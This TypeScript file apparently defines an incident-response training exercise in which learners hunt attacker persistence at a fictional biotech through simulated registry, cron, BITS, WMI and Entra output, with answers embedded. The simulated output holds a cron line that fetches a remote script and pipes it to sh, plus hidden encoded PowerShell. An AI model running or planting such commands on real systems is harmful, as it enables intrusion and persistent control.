import type { RoomExperience } from "./types";

// "Operation Spare Key" for the "persistence-mechanisms" room.
// Script: docs/campaign/30-persistence-mechanisms.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Wexley Biotech (fictional), not the graded tasks' Meridian. Lab data differs
// from the graded tasks: the Run-key console never shows a VPN tray entry
// (ac1); the cron hunt is Linux only and never touches schtasks or integrity
// levels (q1); the anatomy reads a 4698 task registered to a service account,
// never la1's onstart SYSTEM task (or its /ru value, f1); the Entra worksheet
// has no mailbox forwarding rule (q3); and nothing orders containment steps
// (o1) or pairs mechanisms with their log sources (m1).
export const PERSISTENCE_MECHANISMS: RoomExperience = {
  roomId: "persistence-mechanisms",
  codename: "Operation Spare Key",
  theme: "persistence",
  handler: { name: "Ines Carvalho", role: "Incident Response Lead, Wexley Biotech" },
  briefing: [
    "Wexley Biotech. Three research sites, 1,800 staff, and a vaccine trial whose data is worth more than the buildings.",
    "Last month IT wiped a phished laptop and reset the user's password. Nine days later the same attacker was back.",
    "Ines Carvalho runs incident response. She doesn't want the door closed. She wants every spare key the attacker left behind.",
    "Learn where attackers hide a way back in: Run keys, tasks, cron, services, BITS, WMI and the cloud. Then learn the order that actually evicts them.",
  ],
  mission: "Hunt Run keys and the Startup folder, find a cron job planted without root, sweep services, BITS and WMI beyond the usual places, read a task-creation event field by field, and work out what survives a password reset in the cloud.",
  estimate: "~50 min",
  look: { primary: "#34d399", secondary: "#a78bfa", warn: "#f97316" },
  scene: "sparekey",
  layout: "stage",
  stations: [
    {
      id: "runkeys",
      label: "Run Keys",
      topic: "HKCU and HKLM Run and RunOnce · the Startup folder · what the hive says about access",
      tagline: "Find the entry that shouldn't start at logon",
      building: "control",
      taskIds: ["persist-r1"],
    },
    {
      id: "timers",
      label: "Tasks and Cron",
      topic: "schtasks and /ru · system and user crontabs · the setgid crontab bit",
      tagline: "Find a job planted without root",
      building: "lab",
      taskIds: ["persist-r2", "persist-q1"],
    },
    {
      id: "hooks",
      label: "Hidden Hooks",
      topic: "Services and 7045 · BITS NotifyCmdLine · WMI filter, consumer and binding",
      tagline: "Look where the usual sweep doesn't",
      building: "vault",
      taskIds: ["persist-r3", "persist-r4", "persist-q2"],
    },
    {
      id: "systask",
      label: "The SYSTEM Task",
      topic: "Reading a task registration · principal, trigger and path",
      tagline: "Read a task-creation event field by field",
      building: "office",
      taskIds: ["persist-la1", "persist-f1"],
    },
    {
      id: "evict",
      label: "Close Every Door",
      topic: "Cloud accounts and OAuth consent · why persistence changes the remediation order",
      tagline: "Evict them for good",
      building: "ticket",
      taskIds: ["persist-r5", "persist-r6", "persist-q3", "persist-ac1", "persist-m1", "persist-o1"],
      boss: true,
    },
  ],
  personas: {
    "persist-q1": { name: "Ines Carvalho", role: "Incident Response Lead", line: "A SYSTEM task from a Medium-integrity process. Would that even work?" },
    "persist-q2": { name: "Ines Carvalho", role: "Incident Response Lead", line: "Someone checked four places and called the host clean. Do you agree?" },
    "persist-la1": { name: "Ines Carvalho", role: "Incident Response Lead", line: "An accounts-payable analyst just registered a boot task. Read it with me." },
    "persist-q3": { name: "Ines Carvalho", role: "Incident Response Lead", line: "Password reset in minutes, ticket closed, mail still leaking. What did we miss?" },
    "persist-ac1": { name: "Ines Carvalho", role: "Incident Response Lead", line: "A new HKLM Run value on an ops laptop. Threat or rollout?" },
  },
  briefings: {
    // ── Reading 1: Run keys and the Startup folder ──
    "persist-r1": [
      {
        kind: "terminal",
        title: "Hunt the Run Keys",
        prompt: "WKS-LAB14 belongs to a.rahim, a lab scientist. EDR flagged an odd process at logon. Check both Run hives and the Startup folder.",
        shell: "cmd",
        host: "C:\\Users\\a.rahim> ",
        commands: [
          { match: "reg\\s+query\\s+\"?hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\"?\\s*$", help: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   values that start for this user only",
            output: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    OneDrive        REG_SZ    \"C:\\Users\\a.rahim\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\n    AdobeSyncHelper REG_SZ    \"C:\\Users\\a.rahim\\AppData\\Roaming\\adbsync\\syncsvc.exe\" -q" },
          { match: "reg\\s+query\\s+\"?hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\"?\\s*$", help: "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run   values that start for every user (admin to write)",
            output: "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth  REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    LabelPrinter    REG_SZ    \"C:\\Program Files\\Brady\\Workstation\\bwstray.exe\"" },
          { match: "reg\\s+query\\s+\"?hk(cu|lm)\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonce\"?\\s*$", help: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce   one-shot entries",
            output: "(no values)" },
          { match: "dir\\s+.*startup.*", help: "dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"   this user's Startup folder",
            output: " Directory of C:\\Users\\a.rahim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n03/11/2026  08:41             1,214 desktop.ini\n03/11/2026  23:07             2,088 Plate Reader Viewer.lnk\n               2 File(s)          3,302 bytes" },
          { match: "type\\s+.*plate reader viewer\\.lnk.*|.*lnk.*target.*", help: "type \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Plate Reader Viewer.lnk\"   peek at the shortcut target",
            output: "[shortcut] Target: C:\\Windows\\System32\\wscript.exe //B \"C:\\Users\\a.rahim\\AppData\\Roaming\\adbsync\\v.vbs\"\n[shortcut] Created: 2026-11-03 23:07" },
        ],
        objectives: [
          { id: "value", task: "Which Run value does not belong? (its name)", hint: "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", answer: ["adobesynchelper"], why: "An 'Adobe' name launching an unsigned exe from a made-up folder in Roaming. Real Adobe updaters live in Program Files." },
          { id: "hive", task: "Which hive is it in, and did planting it need admin? (HKCU or HKLM)", hint: "Which query showed it?", answer: ["hkcu", "hkcu, no", "hkcu no"], why: "HKCU is writable by the user. The attacker only needed a.rahim's own access, nothing more." },
          { id: "lnk", task: "The Startup folder hides a second foothold. Which program does the shortcut really run?", hint: "dir the Startup folder, then type the .lnk", answer: ["wscript.exe", "wscript", "v.vbs"], why: "A 'Plate Reader Viewer' shortcut that runs a VBScript via wscript from the same adbsync folder. Two mechanisms, one attacker: remove both." },
        ],
      },
    ],
    // ── Reading 2: tasks and cron ──
    "persist-r2": [
      {
        kind: "terminal",
        title: "The Cron Nobody Wrote",
        prompt: "lims-app-02 runs the lab sample system. A beacon fires every few minutes, but no one has root and no escalation alert ever fired. Find the job.",
        shell: "bash",
        host: "ines@lims-app-02:~$ ",
        commands: [
          { match: "(sudo\\s+)?ls\\s+(-l\\S*\\s+)?/etc/cron\\.d/?\\s*$", help: "sudo ls -l /etc/cron.d   system jobs (root only can write here)",
            output: "-rw-r--r-- 1 root root 102 Feb  2  2026 e2scrub_all\n-rw-r--r-- 1 root root 201 Jun 14  2026 lims-backup" },
          { match: "(sudo\\s+)?cat\\s+/etc/cron\\.d/lims-backup", help: "sudo cat /etc/cron.d/lims-backup",
            output: "# nightly LIMS export, change CHG-2213\n30 1 * * * root /opt/lims/bin/export.sh --nightly" },
          { match: "(sudo\\s+)?ls\\s+(-l\\S*\\s+)?/var/spool/cron/crontabs/?\\s*$", help: "sudo ls -l /var/spool/cron/crontabs   per-user crontabs",
            output: "-rw------- 1 deploy  crontab  71 Nov  3 23:12 deploy\n-rw------- 1 limsadm crontab 118 Mar  9  2026 limsadm" },
          { match: "(sudo\\s+)?cat\\s+/var/spool/cron/crontabs/deploy", help: "sudo cat /var/spool/cron/crontabs/deploy",
            output: "*/10 * * * * curl -fsS http://198.51.100.23/u.sh | sh >/dev/null 2>&1" },
          { match: "(sudo\\s+)?cat\\s+/var/spool/cron/crontabs/limsadm", help: "sudo cat /var/spool/cron/crontabs/limsadm",
            output: "# rotate instrument uploads\n0 */6 * * * /opt/lims/bin/rotate_uploads.sh" },
          { match: "ls\\s+(-l\\S*\\s+)?/usr/bin/crontab", help: "ls -l /usr/bin/crontab   check the permission bits",
            output: "-rwxr-sr-x 1 root crontab 39568 Mar 23  2026 /usr/bin/crontab" },
          { match: "(sudo\\s+)?grep\\s+.*deploy.*/etc/(sudoers|group).*|id\\s+deploy", help: "id deploy   what groups and rights the account has",
            output: "uid=1004(deploy) gid=1004(deploy) groups=1004(deploy)\n(no sudoers entry for deploy)" },
        ],
        objectives: [
          { id: "acct", task: "Which account owns the beaconing job?", hint: "sudo ls -l /var/spool/cron/crontabs", answer: ["deploy"], why: "A crontab modified last night at 23:12, belonging to an account with no sudo and no extra groups." },
          { id: "freq", task: "How often does it run? (minutes)", hint: "sudo cat /var/spool/cron/crontabs/deploy", answer: ["10", "every 10 minutes", "*/10"], why: "*/10 in the minute field: every ten minutes, pulling and running a script from an outside address." },
          { id: "bit", task: "Which permission bit let deploy write into the spool without root?", hint: "ls -l /usr/bin/crontab: look at the 's'", answer: ["setgid", "sgid", "set-group-id", "s"], why: "The 's' in the group triplet is setgid: crontab runs with group crontab, which may write the spool. Nothing escalated, so no escalation alert fires." },
        ],
      },
    ],
    // ── Readings 3-4: services, BITS and WMI ──
    "persist-r4": [
      {
        kind: "terminal",
        title: "Beyond the Usual Four",
        prompt: "WKS-LAB14 again. Run keys are cleaned up, but Ines wants a full sweep: services, BITS jobs and the WMI repository.",
        shell: "powershell",
        host: "PS C:\\> ",
        commands: [
          { match: "get-(cim|wmi)\\w*\\s+(-classname\\s+)?win32_service.*", help: "Get-CimInstance Win32_Service | ? PathName -notmatch 'Windows|Program Files' | ft Name,StartMode,StartName,PathName",
            output: "Name         StartMode StartName   PathName\n----         --------- ---------   --------\nWexTelemetry Auto      LocalSystem C:\\Users\\Public\\wtel\\wtelsvc.exe" },
          { match: "bitsadmin\\s+/list\\s+/allusers.*", help: "bitsadmin /list /allusers /verbose   every BITS job, with its notify command",
            output: "GUID: {6f0b9c2e-1d4a-4b7e-9a51-0c3e7d2f8a14} DISPLAY: 'ChromeUpdateCheck'\nTYPE: DOWNLOAD STATE: TRANSFERRED OWNER: WEXLEY\\a.rahim\nFILES: 1 / 1 (http://198.51.100.23/c.bin -> C:\\ProgramData\\cupd\\c.bin)\nNOTIFICATION COMMAND LINE: 'C:\\ProgramData\\cupd\\cupd.exe' '-r'" },
          { match: "get-(cim|wmi)\\w*\\s+.*root.subscription.*__eventfilter.*", help: "Get-CimInstance -Namespace root/subscription -ClassName __EventFilter",
            output: "Name  : SysPerfMon\nQuery : SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240" },
          { match: "get-(cim|wmi)\\w*\\s+.*root.subscription.*consumer.*", help: "Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer",
            output: "Name                : SysPerfMon\nCommandLineTemplate : powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA..." },
          { match: "get-(cim|wmi)\\w*\\s+.*root.subscription.*binding.*", help: "Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding",
            output: "Filter   : __EventFilter.Name=\"SysPerfMon\"\nConsumer : CommandLineEventConsumer.Name=\"SysPerfMon\"" },
        ],
        objectives: [
          { id: "svc", task: "The odd service runs as which account?", hint: "The Win32_Service query", answer: ["localsystem", "system"], why: "Auto start, LocalSystem, binary in C:\\Users\\Public: SYSTEM at every boot from a folder any user can write." },
          { id: "bits", task: "Which program does the BITS job run when its transfer finishes?", hint: "bitsadmin /list /allusers /verbose: NOTIFICATION COMMAND LINE", answer: ["cupd.exe", "c:\\programdata\\cupd\\cupd.exe", "cupd"], why: "The 'Chrome update' job's download is done. It exists only so BITS runs cupd.exe for it." },
          { id: "wmi", task: "The WMI filter fires shortly after boot. Which program does its consumer launch?", hint: "Query the consumer class in root/subscription", answer: ["powershell.exe", "powershell"], why: "Filter + consumer + binding: about four minutes after every boot, hidden encoded PowerShell. None of it lives in Run keys, Task Scheduler or the services list." },
        ],
      },
    ],
    // Drill before the graded task event: a 4698 record, field by field.
    "persist-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of Event 4698",
        prompt: "Before the graded process event: the Security log's own record of a task being registered, field by field.",
        source: "Windows Security log · Event 4698 · A scheduled task was created · LIMS-WIN-03",
        fields: [
          { key: "EventID", value: "4698", label: "What", note: "A scheduled task was created. 4702 is updated, 4699 deleted." },
          { key: "SubjectUserName", value: "it.mbeki", label: "Who registered it", note: "The account that ran the registration, not the account the task will run as." },
          { key: "TaskName", value: "\\Wexley\\InstrumentLogSync" },
          { key: "TaskContent · Triggers", value: "<CalendarTrigger> daily 02:00", label: "When", note: "BootTrigger means every startup; LogonTrigger means at sign-in." },
          { key: "TaskContent · Exec/Command", value: "C:\\Program Files\\Wexley\\LogSync\\logsync.exe", label: "What runs", note: "Program Files: where a vendor or IT tool should live." },
          { key: "TaskContent · Principal/UserId", value: "WEXLEY\\svc-logsync", label: "Runs as", note: "The principal. This, not the subject, decides the task's privileges." },
          { key: "TaskContent · Principal/RunLevel", value: "LeastPrivilege", label: "Elevation", note: "HighestAvailable asks for the full token." },
          { key: "Change record", value: "CHG-2290 · instrument log sync", label: "Paper trail" },
        ],
        summary: "Who registered it, what runs, when, and as whom. Read the graded event the same way: the command line names all four.",
      },
    ],
    // ── Reading 5: cloud persistence ──
    "persist-r5": [
      {
        kind: "worksheet",
        title: "What the Reset Didn't Touch",
        prompt: "h.lund in Clinical Ops was phished at 10:00. The helpdesk reset the password at 11:30 and called it done. Read the Entra audit log for that morning.",
        caption: "Microsoft Entra ID · Audit logs · 2026-11-03",
        columns: ["time", "activity", "initiated by", "target", "detail"],
        rows: [
          ["10:02", "Consent to application", "h.lund", "QuickPDF Sync", "Mail.ReadWrite, Files.Read.All, offline_access"],
          ["10:09", "Add user", "h.lund", "svc-sync02", "created in Clinical Ops"],
          ["10:11", "Add member to role", "h.lund", "svc-sync02", "Global Reader"],
          ["11:30", "Reset user password", "helpdesk.k.ito", "h.lund", "self-service disabled, temp password issued"],
          ["11:31", "Update user", "helpdesk.k.ito", "h.lund", "force change at next sign-in"],
        ],
        questions: [
          { id: "app", q: "Which app was granted access?", hint: "The consent row.", answer: ["quickpdf sync", "quickpdf"], why: "A PDF tool asking for read-write mail and every file: far more than it needs." },
          { id: "token", q: "Which permission lets the app keep working without h.lund signing in again?", hint: "One scope is about refresh tokens.", answer: ["offline_access"], why: "offline_access issues a refresh token. The reset at 11:30 changed the password, not the token." },
          { id: "acct", q: "Which account did the attacker create for later?", hint: "The 'Add user' row.", answer: ["svc-sync02"], why: "A new account with its own password and a directory role. Resetting h.lund's password doesn't touch it." },
        ],
      },
    ],
    // ── Reading 6: why the order matters ──
    "persist-r6": [
      {
        kind: "sort",
        title: "Survives the Reset?",
        prompt: "The attacker's footholds across this operation. Which ones keep working after the victim's password is reset?",
        buckets: [
          { id: "survives", label: "Still works after the reset" },
          { id: "dies", label: "Stops at the reset or the next reboot" },
        ],
        items: [
          { id: "run", text: "AdobeSyncHelper in HKCU Run on WKS-LAB14", bucket: "survives", why: "It runs a program at logon. It never asks for a password." },
          { id: "cron", text: "The deploy crontab on lims-app-02", bucket: "survives", why: "cron runs it every ten minutes as deploy, whatever anyone's password is." },
          { id: "consent", text: "QuickPDF Sync's consent with offline_access", bucket: "survives", why: "The refresh token was issued at consent time. Revoke the grant to stop it." },
          { id: "acct", text: "The svc-sync02 account", bucket: "survives", why: "Its own credentials, its own role." },
          { id: "mem", text: "A beacon living only in memory of a browser process, nothing written to disk", bucket: "dies", why: "No mechanism brings it back: it ends when the process or the host restarts." },
          { id: "sess", text: "An interactive web session that re-prompts for the password after the reset", bucket: "dies", why: "It depends on the password, so the reset ends it." },
        ],
      },
    ],
  },
};
